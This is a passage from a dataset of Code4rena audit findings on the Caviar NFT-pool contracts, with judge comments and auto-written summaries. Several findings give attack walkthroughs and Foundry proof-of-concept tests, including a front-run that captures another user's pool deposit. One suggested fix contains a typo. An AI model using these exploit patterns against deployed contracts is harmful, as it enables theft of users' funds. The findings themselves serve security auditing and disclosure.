success;\n    }\n```\n\n### Recommended Mitigation Steps\n\nChange to:\n\n```sol\n        uint initialBalance = address(this).balance;\n        // ... \n\n        if (baseToken != address(0)) ERC20(baseToken).transferFrom(receiver, address(this), fee);\n        else require(address(this).balance - initialBalance == fee);\n```\n\n**[outdoteth (Caviar) acknowledged](https://github.com/code-423n4/2023-04-caviar-findings/issues/56#issuecomment-1520498279)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/56#issuecomment-1528965969):**\n > I have considered downgrading to QA for the ETH aspect as technically there is no EIP for ETH flashloans (FL EIP is only for ERC20s).\n> \n> That said, the way payment is pulled in ERC20s is breaking the spec, and for this reason am awarding Medium Severity.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem in a code that handles flashloans. Instead of taking the fee from the receiver of the loan, it takes it from the person who initiated the loan. This can result in unexpected loss of funds for the caller. The code also has an issue with ETH pools where it expects the caller to pay the fee upfront, which is not how it should work. The recommended solution is to change the code to transfer the fee from the receiver instead of the initiator. The team responsible for the code has acknowledged the issue and it has been classified as a medium severity bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/56",
      "tags": [],
      "finders": [
        "Ruhum"
      ]
    },
    {
      "id": "43394",
      "title": "[M-15] Pool tokens can be stolen via `PrivatePool.flashLoan` function from previous owner",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L461>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654>\n\n`PrivatePool.sol` ERC721 and ERC20 tokens can be stolen by the previous owner via `execute` and `flashLoan` functions (or by malicious approval by the current owner via `execute`)\n\n### Proof of Concept\n\nLet's say that Bob is the attacker and Alice is a regular user.\n\n1. Bob creates a `PrivatePool.sol` where he deposits 5 ERC721 tokens and 500 USDC.\n2. Then Bob creates a malicious contract (let's call it `PrivatePoolExploit.sol`) and this contract contains `onFlashLoan` (IERC3156FlashBorrower), `transferFrom` ,`ownerOf`, `onERC721Received` functions (like ERC721 does) and an additional `attack` function.\n3. Via `PrivatePool.execute` function Bob approves USDC spending (`type(uint).max`) and `setApprovalForAll` for ERC721 tokens\n4. Since the ownership of `PrivatePool` is stored in `Factory.sol` as an ERC721 token, ownership can be sold on any ERC721 marketplace. Alice decides to buy Bob's `PrivatePool` and ownership is transferred to Alice.\n5. Right after the ownership is transferred, Bob runs `PrivatePoolExploit.attack` function, which calls `PrivatePool.flashLoan` where `PrivatePoolExploit.transferFrom` will be called since the flash loan can be called on any address.\n6. All the funds are stolen by Bob and Alice's`PrivatePool` is left with nothing.\n\nSee warden's [original submission](https://github.com/code-423n4/2023-04-caviar-findings/issues/230) for full POC.\n\n### Tools Used\n\nFoundry/VSCode\n\n### Recommended Mitigation Steps\n\nThe contract caller should not be able to choose the token address in the `PrivatePool.flashLoan` function because there is no way to know if the token contract is actually an ERC721 contract.\n\nSuggest removing `token` from function input parameters and using `nft` token everywhere, where `token` was used.\n\n```solidity\n    function flashLoan(IERC3156FlashBorrower receiver, uint256 tokenId, bytes calldata data)\n        external\n        payable\n        returns (bool)\n    {\n        address nftAddress = nft;\n        // check that the NFT is available for a flash loan\n        if (!availableForFlashLoan(nftAddress, tokenId)) revert NotAvailableForFlashLoan();\n\n        // calculate the fee\n        uint256 fee = flashFee(nftAddress, tokenId);\n\n        // if base token is ETH then check that caller sent enough for the fee\n        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n\n        // transfer the NFT to the borrower\n        ERC721(nftAddress).safeTransferFrom(address(this), address(receiver), tokenId);\n\n        // call the borrower\n        bool success =\n            receiver.onFlashLoan(msg.sender, nftAddress, tokenId, fee, data) == keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n        // check that flashloan was successful\n        if (!success) revert FlashLoanFailed();\n\n        // transfer the NFT from the borrower\n        ERC721(nftAddress).safeTransferFrom(address(receiver), address(this), tokenId);\n\n        // transfer the fee from the borrower\n        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n\n        return success;\n    }\n```\n\n**[outdoteth (Caviar) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/230#issuecomment-1518697291):**\n > I think a potential fix is to prevent execute() from being able to call the baseToken the nft that is associated with the contract, which would stop the malicious approvals.\n\n**[outdoteth (Caviar) mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/230#issuecomment-1520570998):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/2\n> \n> Proposed fix is to add a check in the execute() function that will revert if the target contract is the baseToken or nft.\n> \n> ```solidity\n> if (target == address(baseToken) || target == address(nft)) revert InvalidTarget();\n> ```\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/230#issuecomment-1529072199):**\n > The Warden has shown how, due to composability, it's possible for the previous owner to set the PrivatePool to grant approvals for all it's tokens, in a way that will allow the previous owner to steal them back.\n> \n> There are many considerations to this:\n> - Would a reasonable buyer check for previous approvals?\n> - Would a more reasonable approach be to buy the NFTs and create their own Pool?\n> \n> Nonetheless the Approval Farming can be performed and the attack can be done in that way, however the buyer would have to buy a Pool for which the approvals have been setup and they would have to do so without revoking them (they could buy and revoke in the same tx).\n> \n> Because of this, I belive that the finding is valid but of Medium Severity.\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/24), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/47), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/16).\n\n\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the `PrivatePool.sol` contract where the previous owner of ERC721 and ERC20 tokens can steal them through the `execute` and `flashLoan` functions. This can also be done by the current owner if they maliciously approve the transfer. The report provides a proof of concept where an attacker creates a malicious contract and uses it to steal funds from a new owner of the `PrivatePool` contract. The suggested mitigation steps include removing the ability for the caller to choose the token address in the `PrivatePool.flashLoan` function and using `nft` token instead of `token` in the code. The severity of the bug was initially considered high but was later decreased to medium by the judge. The bug has since been mitigated by the team working on the contract.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/230",
      "tags": [],
      "finders": [
        "Brenzee",
        "ulqiorra",
        "ladboy233"
      ]
    },
    {
      "id": "43393",
      "title": "[M-14] The `royaltyRecipient` could not be prepare to receive ether, making the `sell` to fail",
      "impact": "MEDIUM",
      "content": "\nThe `royaltyRecipient` is an arbitrary address setup by the collection if the collection `royaltyRecipient` is a contract and this contract its not prepared to receive ether the ether transfer will always fail paying the royalties.\n\n### Proof of Concept\n\nHere is a foundry POC, take note that I have to write a new Milady mock collection because in the original is hardcoded to `0xbeefbeef` so its impossible to change the `royaltyRecipient`;  [Milady.sol#L31](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/test/shared/Milady.sol#L31)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport \"test/Fixture.sol\";\n\ncontract POCRejectTest is Fixture {\n    PrivatePool public privatePool;\n    uint256 public totalTokens = 0;\n    uint256 public minOutputAmount = 0;\n\n    uint256 royaltyFeeRate = 0.1e18; // 10%\n    address royaltyRecipient = address(new EthRejecter());\n\n    Milady2 milady2 = new Milady2();\n\n    function setUp() public {\n        milady2.setApprovalForAll(address(ethRouter), true);\n\n        vm.mockCall(\n            address(milady2),\n            abi.encodeWithSelector(ERC721.ownerOf.selector, address(privatePool)),\n            abi.encode(address(this))\n        );\n\n        // lets setup a trap for the royalty        \n        milady2.setRoyaltyInfo(royaltyFeeRate, royaltyRecipient);\n\n    }\n\n    function _addSell() internal returns (EthRouter.Sell memory, uint256) {\n        uint256[] memory empty = new uint256[](0);\n        privatePool = factory.create{value: 100e18}(\n            address(0),\n            address(milady2),\n            100e18,\n            10e18,\n            200,\n            199,\n            bytes32(0),\n            true,\n            false,\n            bytes32(address(this).balance), // random between each call to _addBuy\n            empty,\n            100e18\n        );\n\n        uint256[] memory tokenIds = new uint256[](2);\n        for (uint256 i = 0; i < 2; i++) {\n            milady2.mint(address(this), i + totalTokens);\n            tokenIds[i] = i + totalTokens;\n        }\n\n        totalTokens += 2;\n\n        bytes32[][] memory publicPoolProofs = new bytes32[][](0);\n        EthRouter.Sell memory sell = EthRouter.Sell({\n            pool: payable(address(privatePool)),\n            nft: address(milady2),\n            tokenIds: tokenIds,\n            tokenWeights: new uint256[](0),\n            proof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n            stolenNftProofs: new IStolenNftOracle.Message[](0),\n            isPublicPool: false,\n            publicPoolProofs: publicPoolProofs\n        });\n\n        (uint256 baseTokenAmount,,) = privatePool.sellQuote(tokenIds.length * 1e18);\n        return (sell, baseTokenAmount);\n    }\n\n    function test_PaysRoyalties() public {\n        // arrange\n        EthRouter.Sell[] memory sells = new EthRouter.Sell[](3);\n        (EthRouter.Sell memory sell1, uint256 outputAmount1) = _addSell();\n        (EthRouter.Sell memory sell2, uint256 outputAmount2) = _addSell();\n        minOutputAmount += outputAmount1 + outputAmount2;\n        sells[0] = sell1;\n        sells[1] = sell2;\n        Pair pair = caviar.create(address(milady2), address(0), bytes32(0));\n        deal(address(pair), 1.123e18);\n        deal(address(pair), address(pair), 10e18);\n\n        uint256[] memory tokenIds = new uint256[](2);\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            tokenIds[i] = i + totalTokens;\n            milady2.mint(address(this), i + totalTokens);\n        }\n        sells[2] = EthRouter.Sell({\n            pool: payable(address(pair)),\n            nft: address(milady2),\n            tokenIds: tokenIds,\n            tokenWeights: new uint256[](0),\n            proof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n            stolenNftProofs: new IStolenNftOracle.Message[](0),\n            isPublicPool: true,\n            publicPoolProofs: new bytes32[][](0)\n        });\n\n        uint256 outputAmount = pair.sellQuote(tokenIds.length * 1e18);\n\n        uint256 royaltyFee = outputAmount / tokenIds.length * royaltyFeeRate / 1e18 * tokenIds.length;\n        outputAmount -= royaltyFee;\n        minOutputAmount += outputAmount;\n\n        // act\n        ethRouter.sell(sells, minOutputAmount, 0, true);\n\n        // assert\n        assertEq(address(royaltyRecipient).balance, royaltyFee, \"Should have paid royalties\");\n        assertGt(address(royaltyRecipient).balance, 0, \"Should have paid royalties\");\n    }\n}\n\ncontract EthRejecter {\n    // The contract could not have a method called \"receive\" or \"fallback\", i added here\n    // to show the concept of a contract that rejects ETH\n    receive() external payable {\n        revert(\"ETH REJECTED EXAMPLE\");\n    }\n}\n\ncontract Milady2 is ERC721, ERC2981 {\n    uint256 public royaltyFeeRate = 0; // to 18 decimals\n    address public royaltyRecipient = address(0);\n\n    constructor() ERC721(\"Milady Maker\", \"MIL\") {}\n\n    function tokenURI(uint256) public view virtual override returns (string memory) {\n        return \"https://milady.io\";\n    }\n\n    function mint(address to, uint256 id) public {\n        _mint(to, id);\n    }\n\n    function setRoyaltyInfo(uint256 _royaltyFeeRate, address _royaltyRecipient) public {\n        royaltyFeeRate = _royaltyFeeRate;\n        royaltyRecipient = _royaltyRecipient;\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC2981, ERC721) returns (bool) {\n        return super.supportsInterface(interfaceId);\n    }\n\n    function royaltyInfo(uint256, uint256 salePrice) public view override returns (address, uint256) {\n        return (royaltyRecipient, salePrice * royaltyFeeRate / 1e18);\n    }\n}\n\n```\n\n### Recommended Mitigation Steps\n\nThere are two simple ways from my point of view to force ether send and solve this issue;\n\nYou could use a simple contract that selfdestrcut an firce ether, but selfdestruct is deprecated so it's not a good idea, please view [solady/SafeTransferLib.sol#L65](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L65)\n\nThe other thing you could do is if an address is rejecting ether, send WETH instead, this pattern is common and well known.\n\n**[outdoteth (Caviar) acknowledged via duplicate issue `#713`](https://github.com/code-423n4/2023-04-caviar-findings/issues/713#issuecomment-1518079437)**\n\n\n\n***\n\n",
      "summary": "\nThe report discusses an issue with the `royaltyRecipient` feature in a collection contract. If the `royaltyRecipient` is a contract and not prepared to receive ether, then the ether transfer will fail when paying the royalties. A proof of concept is provided to demonstrate the issue, and two potential mitigation steps are suggested to solve the problem.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/263",
      "tags": [],
      "finders": [
        "Bauer",
        "Koolex",
        "ladboy233",
        "shaka",
        "saian",
        "SovaSlava",
        "Kenshin",
        "0x4non"
      ]
    },
    {
      "id": "43392",
      "title": "[M-13] Transaction revert if the `baseToken` does not support 0 value transfer when charging `changeFee`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L423>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L651>\n\nWhen call change via the PrivatePool.sol, the caller needs to the pay the change fee,\n\n```solidity\n\t// calculate the fee amount\n\t(feeAmount, protocolFeeAmount) = changeFeeQuote(inputWeightSum);\n}\n\n// ~~~ Interactions ~~~ //\n\nif (baseToken != address(0)) {\n\t// transfer the fee amount of base tokens from the caller\n\tERC20(baseToken).safeTransferFrom(\n\t\tmsg.sender,\n\t\taddress(this),\n\t\tfeeAmount\n\t);\n```\n\ncalling changeFeeQuote(inputWeightSum)\n\n```solidity\nfunction changeFeeQuote(\n\tuint256 inputAmount\n) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n\t// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n\tuint256 exponent = baseToken == address(0)\n\t\t? 18 - 4\n\t\t: ERC20(baseToken).decimals() - 4;\n\tuint256 feePerNft = changeFee * 10 ** exponent;\n\n\tfeeAmount = (inputAmount * feePerNft) / 1e18;\n\tprotocolFeeAmount =\n\t\t(feeAmount * Factory(factory).protocolFeeRate()) /\n\t\t10_000;\n}\n```\n\nif the feeAmount is 0,\n\nthe code below would revert if the ERC20 token does not support 0 value transfer\n\n```solidity\nERC20(baseToken).safeTransferFrom(\n\tmsg.sender,\n\taddress(this),\n\tfeeAmount\n);\n```\n\nAccording to <https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\n> Some tokens (e.g. LEND) revert when transferring a zero value amount.\n\nSame issue happens when charging the flashloan fee\n\n```solidity\n    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address token,\n        uint256 tokenId,\n        bytes calldata data\n    ) external payable returns (bool) {\n        // check that the NFT is available for a flash loan\n        if (!availableForFlashLoan(token, tokenId))\n            revert NotAvailableForFlashLoan();\n\n        // calculate the fee\n        uint256 fee = flashFee(token, tokenId);\n\n        // if base token is ETH then check that caller sent enough for the fee\n        if (baseToken == address(0) && msg.value < fee)\n            revert InvalidEthAmount();\n\n        // transfer the NFT to the borrower\n        ERC721(token).safeTransferFrom(\n            address(this),\n            address(receiver),\n            tokenId\n        );\n\n        // call the borrower\n        bool success = receiver.onFlashLoan(\n            msg.sender,\n            token,\n            tokenId,\n            fee,\n            data\n        ) == keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n        // check that flashloan was successful\n        if (!success) revert FlashLoanFailed();\n\n        // transfer the NFT from the borrower\n        ERC721(token).safeTransferFrom(\n            address(receiver),\n            address(this),\n            tokenId\n        );\n\n        // transfer the fee from the borrower\n        if (baseToken != address(0))\n            ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n\n        return success;\n    }\n```\n\nNote the code:\n\n```solidity\nif (baseToken != address(0))\n            ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n```\n\nIf the fee is 0 and baseToken revert in 0 value transfer, the user cannot use flashloan.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol check if the feeAmount is 0 before performing transfer.\n\n```solidity\nif(feeAmount > 0) {\n\tERC20(baseToken).safeTransferFrom(\n\t\tmsg.sender,\n\t\taddress(this),\n\t\tfeeAmount\n\t);\n}\n```\n\n**[outdoteth (Caviar) acknowledged](https://github.com/code-423n4/2023-04-caviar-findings/issues/278#issuecomment-1520730822)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/278#issuecomment-1527433776):**\n > The Warden has shown an edge case, when fee are 0 the call to `safeTransfer` is still performed, this can cause certain ERC20s to revert.\n> \n> Because the PrivatePools are meant to work with ERC20s, and this revert is conditional on the specific token implementation, I agree with Medium Severity.\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the PrivatePool.sol smart contract, which is used for changing tokens. The problem occurs when a user tries to call the change function and needs to pay a fee. The code for calculating the fee and transferring it from the user's account to the contract is causing an issue because it does not check if the fee amount is 0 before attempting the transfer. This can cause the transfer to fail if the token being used does not support transfers of 0 value. This same issue also affects the flashloan function, which allows users to borrow tokens from the contract. The recommended solution is for the protocol to check if the fee amount is 0 before attempting the transfer. The team behind the contract has acknowledged the issue and it has been classified as a medium severity bug by the judges.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/278",
      "tags": [],
      "finders": [
        "ladboy233",
        "jpserrat",
        "0xLanterns",
        "chaduke",
        "peanuts",
        "adriro"
      ]
    },
    {
      "id": "43391",
      "title": "[M-11] `Factory.create`: Predictability of pool address creates multiple issues.",
      "impact": "MEDIUM",
      "content": "\nThe `Factory.create` function is responsible for creating new `PrivatePool`s. It does this using the `LibClone.cloneDeterministic` function.\n\n```solidity\n    function create(\n        ...\n        bytes32 _salt,\n        ...\n    ) public payable returns (PrivatePool privatePool) {\n        if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (_baseToken != address(0) && msg.value > 0)) {\n            revert PrivatePool.InvalidEthAmount();\n        }\n\n        // deploy a minimal proxy clone of the private pool implementation\n        privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));\n\n        // ...\n    }\n```\n\nThe address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. Once the user's create transaction is broadcasted, the `_salt` parameter can be viewed by anyone watching the public mempool.\n\nThis public readability of `_salt` parameter creates two issues:\n\n1.  Stealing of user's deposit amount.<br>\n    If a user intends to create new pool and deposit some funds in it then an attacker can frontrun the user's txns and capture the deposit amounts. Here is how this can happen:\n    - User broadcasts two txns, first one to create a pool with `XXX` as the salt and second one to deposit some ETH into the new pool.\n    - The attacker views these pending txns and frontruns them to create a PrivatePool for himself with same `XXX` salt.\n    - The new pool gets created for the attacker, the address of this pool will be same as what the user will be expecting for his pool.\n    - The user's create pool txn gets reverted but deposit txn gets executed successfully. Hence the user deposited ETH in  attacker's pool.\n    - Being the owner of the pool the attacker simply withdraws the deposited ETH from the PrivatePool.\n\n2.  DoS for `Factory.create`.<br>\n    If a user intends to create a PrivatePool, his create txn can be forcefully reverted by an attacker by deploying a pool for himself using the user's salt. Here is how this can happen:\n    - The user broadcasts the create pool txn with salt `XXX`.\n    - The attacker frontruns the user's txn and creates a pool for hiself using the same `XXX` salt.\n    - The user's original create txn gets reverted as attacker's pool already exist on the predetermined address.\n    - This attack can be repeated again and again resulting in DoS for the `Factory.create` function.\n\n### Proof of Concept\n\nThese test cases were added to `test/PrivatePool/Withdraw.t.sol` file and were ran using `forge test --ffi --mp test/PrivatePool/Withdraw.t.sol --mt test_audit`\n\n```solidity\n    function test_audit_create_stealDeposit() public {\n        address user1 = makeAddr(\"user1\");\n        vm.deal(user1, 10 ether);\n        vm.startPrank(user1);\n\n        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));\n\n        // tries to create pool and deposit funds\n        // 1. factory.create(...)\n        // 2. pool.deposit(...)\n\n        // but user2 frontruns the txns\n\n        address user2 = makeAddr(\"user2\");\n        changePrank(user2);\n\n        uint baseTokenAmount = 0;\n\n        PrivatePool pool = factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n        assertEq(predictedAddress, address(pool));\n        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));\n\n        changePrank(user1);\n\n        vm.expectRevert(LibClone.DeploymentFailed.selector);\n        factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n\n        pool.deposit{ value: 10 ether }(tokenIds, 10 ether);\n        assertEq(address(pool).balance, 10 ether);\n\n        changePrank(user2);\n        pool.withdraw(address(0), tokenIds, address(0), 10 ether);\n        assertEq(address(pool).balance, 0);\n        assertEq(user2.balance, 10 ether);\n    }\n\n    function test_audit_create_DoS() public {\n        address user1 = makeAddr(\"user1\");\n        vm.deal(user1, 10 ether);\n        vm.startPrank(user1);\n\n        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));\n\n        // user1 tries to create pool\n        // factory.create(...)\n\n        // but user2 frontruns the txn\n\n        address user2 = makeAddr(\"user2\");\n        changePrank(user2);\n\n        uint baseTokenAmount = 0;\n\n        PrivatePool pool = factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n        assertEq(predictedAddress, address(pool));\n        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));\n\n        changePrank(user1);\n\n        vm.expectRevert(LibClone.DeploymentFailed.selector);\n        factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n    }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nConsider making the upcoming pool address user specific by combining the salt value with user's address.\n\n```solidity\n    privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(\n        keccak256(abi.encode(msg.seender, _salt))\n    )));\n```\n\n**[outdoteth (Caviar) confirmed and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1520013903):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/9\n> \n> The proposed fix is to include the msg.sender in the salt of the proxy deployment:\n> \n> ```solidity\n> // deploy a minimal proxy clone of the private pool implementation\n> bytes32 salt = keccak256(abi.encode(msg.sender, _salt));\n> privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(salt)));\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1527415720):**\n > This boils down to whether we think a front-run is possible / reasonable.<br>\n> And whether the griefing can be considered protracted in time.\n> \n> I have already judged similar issues, so I'll link those here and share my thoughts\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1528974537):**\n > Per my comments on a similar issue: [#182](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182)\n> \n> I believe that the DOS is possible and fairly easy to achieve, however, there are ways to sidestep it\n> \n> By creating a new pool with new `salt`s it's possible to prevent the DOS, the NFT can then be transferred to the intended owner\n> \n> For this reason am downgrading to Medium Severity.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1528974717):**\n > For context, if pool weren't transferable then the DOS would have been permanent and I would have raised severity.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/29), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/43), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/14).\n\n\n\n***\n\n",
      "summary": "\nReport Summary:\n\nThe Factory.create function is used to create new PrivatePools, but there is a bug that allows attackers to steal the deposit amount from users or cause a denial of service (DoS) by deploying a pool with the same salt as the user. This is possible because the salt parameter, which is used to create the new pool's address, can be viewed by anyone watching the public mempool. A proof of concept was provided and a recommended mitigation step was suggested to make the upcoming pool address user-specific by combining the salt value with the user's address. The status of the bug is confirmed to be mitigated by multiple sources.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/419",
      "tags": [],
      "finders": [
        "philogy",
        "yixxas",
        "Dug",
        "ladboy233",
        "0xTheC0der",
        "saian",
        "dingo2077",
        "juancito",
        "hasmama",
        "adriro",
        "AkshaySrivastav",
        "said",
        "fs0c",
        "hihen",
        "zion",
        "GT\\_Blockchain",
        "holyhansss\\_kr",
        "Haipls",
        "bin2chen",
        "carlitox477",
        "sashik\\_eth"
      ]
    },
    {
      "id": "43390",
      "title": "[M-05] `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions can be DOS'ed for some ERC721 tokens",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209> \n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248> \n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293>\n\n<https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672>\n\n### Impact\n\nThe following `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions call the corresponding ERC721 tokens' `setApprovalForAll` functions.\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209>\n\n```solidity\n    function sell(Sell[] calldata sells, uint256 minOutputAmount, uint256 deadline, bool payRoyalties) public {\n        ...\n        // loop through and execute the sells\n        for (uint256 i = 0; i < sells.length; i++) {\n            ...\n            // approve the pair to transfer NFTs from the router\n            ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true);\n            ...\n        }\n        ...\n    }\n```\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248>\n\n```solidity\n    function deposit(\n        address payable privatePool,\n        address nft,\n        uint256[] calldata tokenIds,\n        uint256 minPrice,\n        uint256 maxPrice,\n        uint256 deadline\n    ) public payable {\n        ...\n        // approve pair to transfer NFTs from router\n        ERC721(nft).setApprovalForAll(privatePool, true);\n        ...\n    }\n```\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293>\n\n```solidity\n    function change(Change[] calldata changes, uint256 deadline) public payable {\n        ...\n        // loop through and execute the changes\n        for (uint256 i = 0; i < changes.length; i++) {\n            Change memory _change = changes[i];\n            ...\n            // approve pair to transfer NFTs from router\n            ERC721(_change.nft).setApprovalForAll(_change.pool, true);\n            ...\n        }\n        ...\n    }\n```\n\nFor ERC721 tokens like Axie, which its `setApprovalForAll` function is shown below, calling their `setApprovalForAll` functions with the same `msg.sender`-`_operator`-`_approved` combination would revert because of requirements like `require(_tokenOperator[msg.sender][_operator] != _approved)`.\n\nFor these ERC721 tokens, calling the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions for the first time, which call such tokens' `setApprovalForAll` functions for the first time, can succeed; however, calling the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions again, which call such tokens' `setApprovalForAll` functions with the same pool as `_operator` and `true` as `_approved` again, will revert. In this case, the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions are DOS'ed for such ERC721 tokens.\n\n<https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672>\n\n```solidity\n  function setApprovalForAll(address _operator, bool _approved) external whenNotPaused {\n    require(_tokenOperator[msg.sender][_operator] != _approved);\n    _tokenOperator[msg.sender][_operator] = _approved;\n    ApprovalForAll(msg.sender, _operator, _approved);\n  }\n```\n\n### Proof of Concept\n\nThe following steps can occur for the described scenario.\n\n1.  Alice calls the `EthRouter.sell` function to sell 1 Axie NFT to a private pool, which succeeds.\n2.  Alice calls the `EthRouter.sell` function again to sell another Axie NFT to the same private pool. However, this function call's execution of `ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true)` reverts because Axie's `require(_tokenOperator[msg.sender][_operator] != _approved)` reverts.\n3.  Bob tries to repeat Step 2 but his `EthRouter.sell` function call also reverts.\n4.  Hence, the `EthRouter.sell` function is DOS'ed for selling any Axie NFTs to the same private pool for any users.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nThe 